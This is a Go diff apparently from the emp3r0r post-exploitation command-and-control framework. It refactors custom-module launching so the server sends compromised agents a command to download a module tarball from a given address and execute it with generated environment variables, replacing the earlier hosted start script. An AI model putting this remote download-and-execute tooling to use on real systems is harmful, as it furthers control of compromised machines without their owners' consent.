@@ -43,11 +43,6 @@ var ModuleNames = make(map[string]string)
 // moduleCustom run a custom module
 func moduleCustom() {
 	go func() {
-		start_script := WWWRoot + CurrentMod + ".sh"
-		if CurrentTarget.GOOS == "windows" {
-			start_script = WWWRoot + CurrentMod + ".ps1"
-		}
-
 		// get module config
 		config, exists := ModuleConfigs[CurrentMod]
 		if !exists {
@@ -68,24 +63,18 @@ func moduleCustom() {
 			download_addr = download_url_opt.Val
 		}
 
-		// most of the time, start script is the only file changing
-		// and it's very small, so we host it for agents to download
-		err = genStartScript(&config, start_script)
+		exec_cmd, envStr, err := genModStartCmd(&config)
 		if err != nil {
-			CliPrintError("Generating start script: %v", err)
+			CliPrintError("Parsing module config: %v", err)
 			return
 		}
 		if config.IsInteractive {
-			// empty out start script
 			// we will run the module as shell
-			err = os.WriteFile(start_script, []byte("echo emp3r0r-interactive-module\n"), 0o600)
-			if err != nil {
-				CliPrintError("write %s: %v", start_script, err)
-				return
-			}
+			exec_cmd = "echo 'emp3r0r-interactive-module'"
 		}
 
 		// in-memory module
+		// TODO: handle different scripting languages
 		if config.InMemory {
 			cmd := fmt.Sprintf("%s --mod_name %s --in_mem --download_addr %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, download_addr)
 			cmd_id := uuid.NewString()
@@ -114,7 +103,9 @@ func moduleCustom() {
 
 		// tell agent to download and execute this module
 		checksum := tun.SHA256SumFile(tarball)
-		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --startscript_checksum %s --download_addr %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum, tun.SHA256SumFile(start_script), download_addr)
+		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --download_addr %s --exec \"%s\"",
+			emp3r0r_data.C2CmdCustomModule,
+			CurrentMod, checksum, envStr, download_addr, exec_cmd)
 		cmd_id := uuid.NewString()
 		err = SendCmdToCurrentTarget(cmd, cmd_id)
 		if err != nil {
@@ -123,8 +114,8 @@ func moduleCustom() {
 
 		// interactive module
 		if config.IsInteractive {
-			opt, exits := config.Options["args"]
-			if !exits {
+			opt, exists := config.Options["args"]
+			if !exists {
 				config.Options["args"] = []string{"--", "No args"}
 			}
 			args := opt[0]
@@ -285,43 +276,21 @@ func readModCondig(file string) (pconfig *emp3r0r_data.ModConfig, err error) {
 	return
 }
 
-// genStartScript reads config.json of a module and generates a start script to invoke the module
-func genStartScript(config *emp3r0r_data.ModConfig, outfile string) error {
-	module_exec_path := fmt.Sprintf("%s/%s/%s", config.Path, config.Name, config.Exec)
+// genModStartCmd reads config.json of a module and generates env string (VAR=value,VAR2=value2 ...)
+func genModStartCmd(config *emp3r0r_data.ModConfig) (exec_path, envStr string, err error) {
+	exec_path = fmt.Sprintf("%s/%s/%s", config.Path, config.Name, config.Exec)
 	var builder strings.Builder
 
 	setEnvVar := func(opt, value string) {
-		if CurrentTarget.GOOS == "windows" {
-			fmt.Fprintf(&builder, "$env:%s='%s' ", opt, value)
-		} else {
-			fmt.Fprintf(&builder, "%s='%s' ", opt, value)
-		}
+		fmt.Fprintf(&builder, "%s=%s ", opt, value)
 	}
-
 	for opt, val_help := range config.Options {
 		setEnvVar(opt, val_help[0])
 	}
 
-	// Append execution command
-	if CurrentTarget.GOOS == "windows" {
-		// when it's not a powershell script, just run it
-		if !strings.HasSuffix(config.Exec, ".ps1") {
-			builder.WriteString(fmt.Sprintf("\n.\\%s", config.Exec))
-		}
-		// else we will append the script to start.ps1
-		mod_data, readErr := os.ReadFile(module_exec_path)
-		if readErr != nil {
-			return readErr
-		}
-		builder.WriteString(fmt.Sprintf("\n%s", mod_data))
-	} else {
-		builder.WriteString(fmt.Sprintf(" ./%s", config.Exec))
-	}
-	defer builder.Reset()
-	_ = os.WriteFile(outfile+".orig", []byte(builder.String()), 0o600)
+	envStr = builder.String()
 
-	// write to file
-	return os.WriteFile(outfile, []byte(builder.String()), 0o600)
+	return
 }
 
 func updateModuleHelp(config *emp3r0r_data.ModConfig) error {
